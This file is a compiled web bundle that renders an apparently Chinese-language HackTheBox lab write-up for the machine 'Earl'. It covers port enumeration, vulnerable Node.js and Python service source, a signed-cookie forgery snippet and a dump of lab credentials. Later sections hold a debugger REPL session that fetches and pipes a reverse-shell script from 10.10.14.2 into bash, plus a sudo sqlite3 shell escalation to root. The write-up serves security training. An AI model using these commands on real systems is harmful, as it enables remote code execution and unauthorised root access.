"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[1168],{7587:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>d,contentTitle:()=>o,default:()=>p,frontMatter:()=>i,metadata:()=>r,toc:()=>l});const r=JSON.parse('{"id":"HackTheBox/Battlegrounds/Earl","title":"Earl","description":"\u4fe1\u606f\u6536\u96c6","source":"@site/docs/HackTheBox/Battlegrounds/Earl.md","sourceDirName":"HackTheBox/Battlegrounds","slug":"/HackTheBox/Battlegrounds/Earl","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Battlegrounds/Earl","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Battlegrounds/Earl.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"Defy","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Battlegrounds/Defy"},"next":{"title":"Emilie","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Battlegrounds/Emilie"}}');var t=s(74848),a=s(28453);const i={},o="Earl",d={},l=[{value:"\u4fe1\u606f\u6536\u96c6",id:"\u4fe1\u606f\u6536\u96c6",level:2},{value:"Port 3000 Nodejs",id:"port-3000-nodejs",level:2},{value:"Port 8000 Python",id:"port-8000-python",level:2},{value:"Port 1234 node inspect",id:"port-1234-node-inspect",level:2},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2}];function c(e){const n={code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"earl",children:"Earl"})}),"\n",(0,t.jsx)(n.h2,{id:"\u4fe1\u606f\u6536\u96c6",children:"\u4fe1\u606f\u6536\u96c6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'Detected ss and lsof, executing related commands...\nPort: 22, PID: 721\n\u2014> Command: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups \nPort: 3000, PID: 1519\n\u2014> Command: /usr/bin/node app.js \nPort: 8000, PID: 1529\n\u2014> Command: /usr/bin/python3 server.py \nPort: 9229, PID: 2353\n\u2014> Command: /usr/bin/node --inspect-brk=9229 -h \nPort: 1234, PID: 779\n\u2014> Command: socat TCP-LISTEN:1234,reuseaddr,fork EXEC:node inspect -h,pty \nPort: 53, PID: 565\n\u2014> Command: /lib/systemd/systemd-resolved \n\n## \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 ##\n\nNginx is not installed.\n\n## \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 ##\n\nApache is not installed.\n\n## \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 ##\n\nChecking /etc/sudoers (active configurations only):\n  Defaults      env_reset\n  Defaults      mail_badpass\n  Defaults      secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"\n  root  ALL=(ALL:ALL) ALL\n  %admin ALL=(ALL) ALL\n  %sudo ALL=(ALL:ALL) ALL\n  duke ALL = (root) NOPASSWD: /usr/bin/sqlite3\n\u2014\u2014\u2014\nFinding SUID files:\n  root  ALL=(ALL:ALL) ALL\n  %admin ALL=(ALL) ALL\n  %sudo ALL=(ALL:ALL) ALL\n  duke ALL = (root) NOPASSWD: /usr/bin/sqlite3\n\u2014\u2014\u2014\nFinding files with special capabilities:\n  /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep\n  /usr/bin/mtr-packet = cap_net_raw+ep\n  /usr/bin/traceroute6.iputils = cap_net_raw+ep\n  /usr/bin/ping = cap_net_raw+ep\n\u2014\u2014\u2014\n'})}),"\n",(0,t.jsx)(n.h2,{id:"port-3000-nodejs",children:"Port 3000 Nodejs"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-javascript",metastring:'title="/home/duke/node/app.js"',children:"const express = require(\"express\");\nconst cookieParser = require('cookie-parser')\nconst crypto = require('crypto');\nconst db = require('better-sqlite3')('/opt/credentials.db', {});\n\nconst app = express();\nconst secret = '5b011d9e8a36fa05832f9c3032d10123';\napp.use(cookieParser(secret));\n\nlet credentials = { };\n\nconst hash = (token) => crypto.createHash('md5').update(token).digest('hex');\n\nconst data = db.prepare('SELECT * FROM credentials').all();\nfor(let i = 0; i < data.length; i++) {\n        if(!credentials[data[i].user]) {\n                credentials[data[i].user] = {};\n        }\n        credentials[data[i].user][data[i].info] = data[i].password;\n}\n\napp.get('/', (req, res) => {\n        if (!req.signedCookies.user)\n                res.cookie('user', { admin: false }, { signed: true });\n\n        res.sendFile(__dirname + \"/index.html\");\n});\n\napp.get('/api/addCredentials', (req, res) => {\n        if(!req.signedCookies.user) {\n                res.json({\"msg\" : \"Not logged in\"});\n                return;\n        }\n        let { username, password, info } = req.query;\n        if (username && password && info) {\n                if(!credentials[username]) {\n                        credentials[username] = {};\n                }\n                credentials[username][info] = password;\n        }\n        res.json({\"msg\" : \"Credentials saved\"});\n});\n\napp.get('/api/vault', (req, res) => {\n        let user = { isAdmin: false };\n        if(req.signedCookies.admin === true) {\n                user.passcode = \"c00d2d9e92e77a00107454ea2439fe84\";\n                user.isAdmin = true;\n        }\n\n        if (req.query.passcode && hash(req.query.passcode) === user.passcode) {\n                res.json(credentials);\n        } else {\n                res.json({\"msg\" : \"Incorrect passcode\"});\n        }\n\n});\n\napp.listen(3000, \"0.0.0.0\");\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u53ef\u80fd\u7684\u653b\u51fb\u65b9\u5f0f"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-javascript",children:"const cookieParser = require('cookie-parser');\nconst express = require('express');\nconst app = express();\nconst secret = '20945';\napp.use(cookieParser(secret));\n\nconst userCookie = { admin: true };\nconst signedCookie = 's:' + Buffer.from(JSON.stringify(userCookie)).toString('base64') + '.' + crypto.createHmac('sha256', secret).update(JSON.stringify(userCookie)).digest('base64');\nconsole.log('Signed Cookie:', signedCookie);\n"})}),"\n",(0,t.jsx)(n.h2,{id:"port-8000-python",children:"Port 8000 Python"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",metastring:'title="/home/duke/py"',children:"from http.server import HTTPServer, BaseHTTPRequestHandler\nimport json\nimport sqlite3\n\nconn = sqlite3.connect('/opt/credentials.db')\ndata = conn.execute(\"SELECT * FROM credentials\")\npasswords = data.fetchall()\n\nclass Handler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        if self.path == '/passwords':\n            if self.client_address[0] != '127.0.0.1':\n                res = \"Invalid remote client\"\n                self.send_response(403)\n                self.end_headers()\n                self.wfile.write(res.encode())\n                return\n            else:\n                self.send_response(200)\n                self.send_header(\"Content-Type\", \"application/json\")\n                self.end_headers()\n                self.wfile.write(json.dumps(self.passwords).encode())\n                return\n        if self.path == '/addCredentials':\n            res = \"Service Disabled\"\n            self.send_response(403)\n            self.end_headers()\n            self.wfile.write(res.encode())\n            return\n        if self.path == '/':\n            res = \"Password Manager (Deprecated)\"\n            self.send_response(403)\n            self.end_headers()\n            self.wfile.write(res.encode())\n            return\n        else:\n            res = ('Path' + self.path + ' does not exist\\n').format(site=self)\n            self.send_response(404)\n            self.send_header('content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(res.encode())\n            return\n\nHTTPServer(('0.0.0.0', 8000), Handler).serve_forever()\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u9650\u5236\u4e86\u4ec5\u672c\u5730\u624d\u53ef\u8bbf\u95ee\uff0c\u4f30\u8ba1\u662f\u7528\u6765\u63d0\u6743\u7684"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'sqlite> .table\n(remote) root@htb:/home/duke/py# sqlite3 /opt/credentials.db \nSQLite version 3.31.1 2020-01-27 19:55:54\nEnter ".help" for usage hints.\nsqlite> .table\ncredentials\nsqlite> select * from credentials;\nduke|work|f0f7f79a275a83bfe8769dfd81d40bb2\nduke|Windows|pass123\nsam|Facebook|Test123!\n'})}),"\n",(0,t.jsx)(n.h2,{id:"port-1234-node-inspect",children:"Port 1234 node inspect"}),"\n",(0,t.jsx)(n.p,{children:"\u53ef\u80fd\u901a\u8fc7 console \u547d\u4ee4\u5b9e\u73b0\u4efb\u610f\u547d\u4ee4\u6267\u884c"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"debug> repl\nPress Ctrl+C to leave debug repl\n> require('child_process').execSync('whoami').toString()\nrequire('child_process').execSync('cat /opt/flag.txt').toString()\nrequire('child_process').execSync('wget 10.10.14.2/revshells-python3.sh').toString()\nrequire('child_process').execSync('chmod +x revshells-python3.sh').toString()\nrequire('child_process').execSync('bash ./revshells-python3.sh').toString()\nrequire('child_process').execSync('curl 10.10.14.2/revshells-python3.sh | bash').toString()\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:s(10679).A+"",width:"1008",height:"291"})}),"\n",(0,t.jsx)(n.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"sudo /usr/bin/sqlite3 /dev/null '.shell /bin/bash'\n"})})]})}function p(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(c,{...e})}):c(e)}},10679:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/image_20250455-195553-c6631130204d151c87c51805bdcff9f4.png"},28453:(e,n,s)=>{s.d(n,{R:()=>i,x:()=>o});var r=s(96540);const t={},a=r.createContext(t);function i(e){const n=r.useContext(a);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:i(e.components),r.createElement(a.Provider,{value:n},e.children)}}}]);